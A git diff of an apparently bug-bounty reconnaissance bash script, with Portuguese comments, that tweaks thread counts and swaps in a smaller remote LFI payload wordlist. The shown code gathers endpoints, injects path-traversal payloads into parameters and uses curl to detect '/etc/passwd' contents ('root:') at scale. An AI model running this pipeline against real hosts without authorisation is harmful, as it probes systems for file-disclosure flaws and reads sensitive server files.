@@ -125,7 +125,7 @@ cat "$folder/live_subdomains.txt" | egrep -i "internal|api|test|prod|private|sec
 
 # Executando gau para encontrar endpoints
 echo "Finding endpoints with gau..."
-cat "$folder/live_subdomains.txt" | gau --threads 30 >> "$folder/Endpoints.txt"
+cat "$folder/live_subdomains.txt" | gau --threads 10 >> "$folder/Endpoints.txt"
 
 # Executando waybackurls
 echo "Executando waybackurls..."
@@ -146,9 +146,9 @@ uro -i "$folder/Endpoints.txt" -o "$folder/Endpoints.txt"
 # Usando gf patterns
 echo "Finding gf lfi vulnerabilities with gf..."
 # Passar caminho da Wordlist de paylouds!!!
-# https://raw.githubusercontent.com/mrxbug/lfi-paylouds/main/LFIpayloads.txt
+# https://raw.githubusercontent.com/mrxbug/lfi-paylouds-small/main/lfi.txt
 cat "$folder/Endpoints.txt" | gf lfi | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q Lfi.txt
-cat ~/wordlists/payloads/LFIpayloads.txt | xargs -P 50 -I % bash -c "cat Lfi.txt | qsreplace % " 2> /dev/null | anew -q templfi.txt
+cat ~/wordlists/payloads/lfi.txt | xargs -P 50 -I % bash -c "cat Lfi.txt | qsreplace % " 2> /dev/null | anew -q templfi.txt
 xargs -a templfi.txt -P 50 -I % bash -c "curl -s -L  -H \"X-Bugbounty: Testing\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36\" --insecure '%' | grep \"root:\" && echo -e \"[POTENTIAL LFI] - % \n \"" 2> /dev/null | grep "POTENTIAL LFI" | anew -q "$folder/vulnerabilitieslfi.txt"
 mv Lfi.txt "$folder/lfi.txt"
 rm templfi.txt
